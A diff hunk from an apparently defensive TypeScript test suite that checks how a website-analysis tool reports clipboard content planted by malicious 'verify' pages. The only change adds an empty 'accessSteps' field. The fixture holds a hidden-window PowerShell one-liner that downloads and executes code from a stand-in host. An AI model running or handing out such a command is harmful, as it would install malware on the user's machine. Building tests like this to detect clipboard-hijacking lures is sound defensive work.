@@ -141,7 +141,7 @@ describe("what a page put on the clipboard, as evidence", () => {
 		const writes = [{ ...write("powershell -w h -c \"iex(irm https://verify-check.example/v)\"", "https://trylevo.app/verify"), via: "exec_command" as const }, write(TRYLEVO_PAYLOAD)];
 		const [system, user] = buildWebsiteAnalysisInput(archive([writes[1]!]), {
 			finding: "The page distributes malware.",
-			visit: { outcome: "completed", actions: [], dataSent: [], downloadFailures: [], clipboardWrites: writes },
+			visit: { outcome: "completed", actions: [], accessSteps: [], dataSent: [], downloadFailures: [], clipboardWrites: writes },
 		});
 		expect(system.content).toContain("what it put on the clipboard");
 		expect(system.content).toContain("when a copy control copies something other than what the page shows, say what it shows and what it copies");
